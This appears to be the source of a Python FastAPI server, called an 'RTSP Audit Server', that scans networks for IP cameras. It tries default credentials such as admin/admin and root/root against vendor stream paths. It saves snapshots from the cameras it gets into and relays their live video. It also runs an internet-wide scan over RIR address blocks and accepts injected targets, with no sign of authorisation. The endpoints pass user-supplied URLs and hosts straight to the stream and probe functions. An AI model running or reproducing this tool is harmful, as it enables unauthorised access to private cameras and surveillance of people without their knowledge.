import asyncio
import json
import os
import socket
import cv2
import time
from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, StreamingResponse
from sse_starlette.sse import EventSourceResponse
from engine import Archiver, run_scan

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

os.makedirs("static/screens", exist_ok=True)
if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

rir_scanner = Archiver("rtsp_scan.db")

@app.on_event("startup")
async def startup_event():
    rir_scanner.init_db_sync()

PATHS = [
    "stream", "live", "1", "video", "cam", "ch01",
    "Streaming/Channels/101",
    "cam/realmonitor?channel=1&subtype=0",
    "axis-media/media.amp",
    "profile2/media.smp",
    "h264Preview_01_main",
    "user=admin&password=&channel=1&stream=0.sdp",
]

CREDS = [
    ("", ""),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("root", "root"),
    ("root", ""),
    ("user", "user"),
    ("guest", "guest"),
]

VENDORS = {
    "Streaming/Channels": "Hikvision",
    "cam/realmonitor": "Dahua",
    "axis-media": "Axis",
    "profile2": "Hanwha",
}


def get_local_network():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        parts = local_ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24", local_ip
    except:
        return "192.168.1.0/24", "127.0.0.1"


def guess_vendor(path):
    for key, vendor in VENDORS.items():
        if key in path:
            return vendor
    return "Desconhecido"


def try_capture(ip, port, user, pwd, path):
    url = (
        f"rtsp://{user}:{pwd}@{ip}:{port}/{path}"
        if user
        else f"rtsp://{ip}:{port}/{path}"
    )
    cap = cv2.VideoCapture(url)
    cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 2000)
    cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 2000)
    opened = cap.isOpened()
    screenshot = None
    if opened:
        ret, frame = cap.read()
        if ret:
            fname = f"{ip.replace('.','_')}_{port}.jpg"
            fpath = f"static/screens/{fname}"
            cv2.imwrite(fpath, frame)
            screenshot = f"/static/screens/{fname}"
    cap.release()
    return url if opened else None, screenshot


async def scan_generator(cidr):
    yield {"event": "status", "data": json.dumps({"msg": f"Iniciando scan local em {cidr}..."})}

    proc = await asyncio.create_subprocess_exec(
        "nmap", "-p", "554,8554,5554", "--open", "-T4", "-oG", "-", cidr,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.DEVNULL,
    )
    stdout, _ = await proc.communicate()

    hosts = []
    for line in stdout.decode().splitlines():
        if "Ports:" in line and "open" in line:
            ip = line.split()[1]
            ports = []
            for part in line.split("Ports:")[1].split(","):
                if "open" in part:
                    ports.append(int(part.strip().split("/")[0]))
            hosts.append({"ip": ip, "ports": ports})

    yield {
        "event": "hosts",
        "data": json.dumps({"total": len(hosts), "hosts": [h["ip"] for h in hosts]}),
    }

    for host in hosts:
        ip = host["ip"]
        yield {"event": "probing", "data": json.dumps({"ip": ip})}
        found = False
        for port in host["ports"]:
            if found: break
            for user, pwd in CREDS:
                if found: break
                for path in PATHS:
                    url, screenshot = await asyncio.get_event_loop().run_in_executor(
                        None, try_capture, ip, port, user, pwd, path
                    )
                    if url:
                        cam = {
                            "ip": ip,
                            "port": port,
                            "url": url,
                            "screenshot": screenshot,
                            "auth": f"{user}:{pwd}" if user else "sem autenticação",
                            "path": path,
                            "vendor": guess_vendor(path),
                            "vulnerable": True,
                        }
                        yield {"event": "camera", "data": json.dumps(cam)}
                        found = True
                        break
        if not found:
            yield {
                "event": "camera",
                "data": json.dumps({
                    "ip": ip,
                    "port": host["ports"][0] if host["ports"] else 554,
                    "url": None,
                    "screenshot": None,
                    "auth": None,
                    "path": None,
                    "vendor": "Desconhecido",
                    "vulnerable": False,
                }),
            }

    yield {"event": "done", "data": json.dumps({"msg": "Scan local concluído"})}


def gen_frames(rtsp_url):
    # Set transport option BEFORE opening the capture
    cap = cv2.VideoCapture(rtsp_url, cv2.CAP_FFMPEG)
    # Using a list of parameters to avoid os.environ racing
    # Note: for older opencv versions, this is the most reliable way
    cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 12000) # 12 seconds for slow links
    cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 12000)
    
    frame_count = 0
    empty_frames = 0
    
    try:
        while True:
            success, frame = cap.read()
            if not success:
                empty_frames += 1
                if empty_frames > 40: # Much higher tolerance for initial buffering
                    break
                time.sleep(0.25)
                continue
            
            empty_frames = 0
            frame_count += 1
            
            # Skip 1 out of 2 frames (approx 15fps) - Better balance than 1/3
            if frame_count % 2 != 0:
                continue

            h, w = frame.shape[:2]
            if w > 1280:
                frame = cv2.resize(frame, (1280, int(h * (1280 / w))))
            
            ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            if not ret: continue
            
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
            
            # Small break to allow other threads to run
            time.sleep(0.05)
    finally:
        cap.release()


async def rir_scan_generator():
    if not rir_scanner.is_running:
        asyncio.create_task(run_scan(rir_scanner))
    async for event in rir_scanner.event_generator():
        yield {"event": event["event"], "data": json.dumps(event)}


@app.get("/")
async def index():
    if os.path.exists("static/index.html"):
        return FileResponse("static/index.html")
    return {"msg": "RTSP Audit Server Running. Use /api/scan/rir to start a global scan."}


@app.get("/api/network")
async def network_info():
    cidr, local_ip = get_local_network()
    return {"cidr": cidr, "local_ip": local_ip}


@app.get("/api/scan")
async def scan(cidr: str = ""):
    if not cidr:
        cidr, _ = get_local_network()
    return EventSourceResponse(scan_generator(cidr))


@app.get("/api/scan/rir")
async def scan_rir():
    return EventSourceResponse(rir_scan_generator())


@app.post("/api/scan/rir/skip")
async def skip_rir_block():
    rir_scanner.skip_requested = True
    return {"msg": "Skip requested for current block"}


@app.post("/api/scan/rir/stop")
async def stop_rir_scan():
    rir_scanner.is_running = False
    return {"msg": "Stop signal sent (engine will halt on next iteration)"}


@app.get("/api/live")
async def live_stream(url: str):
    return StreamingResponse(gen_frames(url), media_type="multipart/x-mixed-replace; boundary=frame")


@app.post("/api/scan/inject")
async def inject_target(target: str):
    """Injeta um alvo ou rede manualmente na fila de prioridade."""
    if not rir_scanner.is_running:
        asyncio.create_task(run_scan(rir_scanner))
        await asyncio.sleep(1)
    rir_scanner.inject_high_priority(target)
    return {"status": "injected", "target": target}


@app.get("/api/results")
async def get_results(status: str = "open", bookmarked: int = None):
    import sqlite3
    con = sqlite3.connect(rir_scanner.db_path)
    con.row_factory = sqlite3.Row
    if bookmarked is not None:
        rows = con.execute("SELECT * FROM results WHERE bookmarked=?", (bookmarked,)).fetchall()
    else:
        rows = con.execute("SELECT * FROM results WHERE status=?", (status,)).fetchall()
    con.close()
    return [dict(r) for r in rows]


@app.get("/api/bookmark/ids")
async def get_bookmarked_ids():
    import sqlite3
    con = sqlite3.connect(rir_scanner.db_path)
    rows = con.execute("SELECT ip FROM results WHERE bookmarked=1").fetchall()
    con.close()
    return [r[0] for r in rows]


@app.post("/api/bookmark")
async def toggle_bookmark(ip: str, state: int):
    import sqlite3
    con = sqlite3.connect(rir_scanner.db_path)
    con.execute("UPDATE results SET bookmarked=? WHERE ip=?", (state, ip))
    con.commit(); con.close()
    # Sync with TXT file
    await rir_scanner.sync_favorites_txt()
    return {"status": "success", "ip": ip, "bookmarked": state}


@app.get("/api/debug/probe")
async def debug_probe(ip: str, port: int = 554, path: str = "/"):
    import socket, base64
    log = []
    try:
        s = socket.create_connection((ip, port), timeout=4)
        def send_req(method, url):
            req = f"{method} {url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: IFAC-Debug/1.0\r\n\r\n"
            s.send(req.encode())
            resp = s.recv(4096).decode(errors='ignore')
            log.append({"req": req, "resp": resp})
            return resp
        send_req("OPTIONS", f"rtsp://{ip}:{port}/")
        send_req("DESCRIBE", f"rtsp://{ip}:{port}{path}")
        s.close()
        return {"ip": ip, "log": log}
    except Exception as e:
        return {"ip": ip, "error": str(e), "log": log}
